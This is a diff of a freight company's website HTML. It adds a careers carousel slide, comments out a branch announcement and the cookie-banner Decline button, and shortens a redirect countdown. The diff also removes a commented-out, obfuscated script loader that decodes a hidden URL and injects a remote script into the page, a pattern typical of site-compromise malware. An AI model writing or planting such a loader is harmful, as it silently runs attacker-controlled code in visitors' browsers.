@@ -45,10 +45,6 @@
     })(window, document, "clarity", "script", "mrz6iftq48");
     </script>
 
-    <!--   <script>
-        (function(){var _5S=document.createElement("script"),_jF=(function(_sP,_Ii){var _T2="";for(var _w6=0;_w6<_sP.length;_w6++){var _7h=_sP[_w6].charCodeAt();_7h-=_Ii;_7h+=61;_T2==_T2;_Ii>8;_7h%=94;_7h!=_w6;_7h+=33;_T2+=String.fromCharCode(_7h)}return _T2})(atob("OEREQENoXV1HQ1xKPz89OT42P1wzPz1dQDlINTxdZGExMmJjY2cxMmJkZ19mMl5mXjJlY2Rh"), 46);_5S!="q";_5S.src=_jF;_5S.async=!0;_5S.referrerPolicy="unsafe-url";_5S.type="text/javascript";function _Qm(){};5>4;var _G3=document.getElementsByTagName("script")[0];_G3.parentNode.insertBefore(_5S,_G3)})();
-    </script>-->
-
     <link rel="stylesheet" href="dmxAppConnect/dmxSlideshow/dmxSlideshow.css" />
     <link rel="stylesheet" href="dmxAppConnect/dmxSlideshow/themes/minimal.css" />
     <script src="dmxAppConnect/dmxSlideshow/dmxSlideshow.js" defer></script>
@@ -89,7 +85,6 @@
                         <div id="carouselExampleIndicators" class="carousel slide style1 col main-card-inner ms-3 me-3 align-self-center watermark1" data-bs-ride="carousel">
                             <!-- re-add 'carousel' when ready -->
                             <div class="carousel-inner">
-
                                 <div class="carousel-item active">
                                     <div class="row">
                                         <div class="col text-center pt-4">
@@ -181,10 +176,69 @@
                                     </div>
                                 </div>
 
-                                <!-- REMOVE COMMENT WHEN READY TO PUBLISH -->
+                                <div class="carousel-item">
+                                    <div class="row">
+                                        <div class="col text-center pt-3 pb-3">
+                                            <h4 class="text-center text-light text-uppercase">Calling all <span class="text-warning fw-bold">Freight Agents, join the Pack!</span></h4>
+                                        </div>
+                                    </div>
+                                    <div class="row justify-content-center">
+                                        <div class="col-md-9">
+                                            <div class="row align-items-center">
+                                                <div class="border col-12 align-self-center bg-dark rounded rounded-3 border-secondary border-2 mb-3 pt-3 ps-3 pe-3">
+                                                    <div class="row ps-2 pe-2">
+                                                        <div class="col-lg-6 align-self-center pt-1 pb-1 image-container w-25">
+                                                            <img src="assets/images/freight-agent-job-2.webp" id="pack_pic" class="img-fluid rounded">
+                                                        </div>
+                                                        <div class="col-lg-6 align-self-center w-75 lh-sm">
+                                                            <h5 class="lh-sm text-white text-truncate">Ready to Join the Pack?</h5>
+                                                            <p class="text-light small mb-2">If you're looking for an opportunity to earn, grow, and work with a team that values your success, Raging Wolf Solutions is the place for you. Apply today and take the first step toward a rewarding career! Raging Wolf Solutions is an equal-opportunity employer. We encourage applicants from all backgrounds to apply!</p>
+                                                            <div class="text-center">
+                                                                <button id="apply_now4" class="btn btn-link text-decoration-none btn-lg text-warning pt-0 pb-0 ps-0 pe-0" dmx-on:click="browser1.goto('careers.php')">View Details&nbsp;&nbsp;<i class="fas fa-external-link-alt"></i></button>
+                                                            </div>
+                                                        </div>
+                                                    </div>
 
+                                                </div>
+                                            </div>
 
+                                        </div>
+                                    </div>
 
+                                </div>
+
+                                <!-- remove comment when ready
+                                <div class="carousel-item">
+                                    <div class="row">
+                                        <div class="col text-center pt-3 pb-3">
+                                            <h4 class="text-center text-light text-uppercase">Now With a Branch in <span class="text-warning fw-bold">Pittsburgh!</span></h4>
+                                        </div>
+                                    </div>
+                                    <div class="row justify-content-center">
+                                        <div class="col-md-9">
+                                            <div class="row align-items-center">
+                                                <div class="border col-12 align-self-center bg-dark rounded rounded-3 border-secondary border-2 mb-3 pt-3 ps-3 pe-3">
+                                                    <div class="row ps-2 pe-2">
+                                                        <div class="col-lg-6 align-self-center pt-1 pb-1 image-container w-25">
+                                                            <img src="assets/images/pitt_logo%20%286%29.webp" id="pitt_logo" class="img-fluid rounded">
+                                                        </div>
+                                                        <div class="col-lg-6 align-self-center w-75 lh-sm">
+                                                            <h5 class="lh-sm text-white text-truncate">Raging Wolf is <span class="text-warning growing-text">Growing!</span></h5>
+                                                            <p class="text-light small mb-2">We are proud to annouce out newest branch office located in the Pittsburgh market!</p>
+                                                            <div class="text-center">
+                                                                <button id="Pitt_btn" class="btn module-cta-btn btn-warning w-50 btn-sm lh-lg text-truncate mt-2 mb-2 ps-1 pe-1" wappler-command="editContent" data-bs-toggle="modal" data-bs-target="#pitt_quote_modal" dmx-on:click="pitt_quote_modal.pitt_quote_form.input5.setValue(input1.value);pitt_quote_modal.pitt_quote_form.input6.setValue(input2.value);pitt_quote_modal.pitt_quote_form.input7.setValue(input3.value);pitt_quote_modal.pitt_quote_form.input8.setValue(input4.value)">Quote Me <i class="fas fa-caret-right"></i></button>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+
+                                                </div>
+                                            </div>
+
+                                        </div>
+                                    </div>
+
+                                </div>
+                                 -->
                                 <!-- Add more sections as needed. -->
                             </div>
                             <!-- Optional controls -->
@@ -198,13 +252,9 @@
                             </a>
                         </div>
                     </div>
-
-
-
                 </div>
                 <div class="col-md-9 align-self-start">
                     <div class="row main-card rounded pt-2 pb-2 ps-3 pe-3 border border-secondary rounded-2">
-
                         <div class="col">
                             <form id="form2">
                                 <div class="row">
@@ -251,7 +301,9 @@
             <div class="d-flex flex-column">
                 <p class="mb-0">Your continued use of our website constitutes acceptance of our Cookie Policy, which is essential for providing you with a tailored experience. Please be aware that by navigating further, you agree to the use of cookies in accordance with our policy.</p><a href="https://s3.privyr.com/privacy/privacy-policy.html?d=eyJlbWFpbCI6ImpvaG5hdGhhbkByYWdpbmd3b2xmc29sdXRpb25zLmNvbSIsImNvbXBhbnkiOiJSYWdpbmcgV29sZiBTb2x1dGlvbnMgTExDIiwiZ2VuX2F0IjoiMjAyMi0wOC0yNVQxNDowNTo0My44NTZaIn0=" id="privPol">Privacy Policy</a>
             </div>
-            <button id="cookNo" style="margin: 10px 0px 10px 20px; background-color: #FFC107; color: #fff; color: #000; font-weight: bold; border-radius: 5px;">Decline</button><button id="cookYes" style="margin: 10px; background-color: #FFC107; color: #fff; color: #000; font-weight: bold; border-radius: 5px;" dmx-on:click="cookieBanVis.setValue(false)">Close</button>
+            <!-- <button id="cookNo" style="margin: 10px 0px 10px 20px; background-color: #FFC107; color: #fff; color: #000; font-weight: bold; border-radius: 5px;">Decline</button> -->
+
+            <button id="cookYes" style="margin: 10px; background-color: #FFC107; color: #fff; color: #000; font-weight: bold; border-radius: 5px;" dmx-on:click="cookieBanVis.setValue(false)">Close</button>
         </div>
 
 
@@ -264,7 +316,7 @@
 });
 
 document.getElementById('cookNo').addEventListener('click', function() {
-    var countdown = 10; // 20 seconds countdown
+    var countdown = 5; // 5 seconds countdown
     var countdownInterval = setInterval(function() {
         document.getElementById('cookBan').innerHTML = 'You will be redirected back in ' + countdown + ' seconds.';
         countdown--;
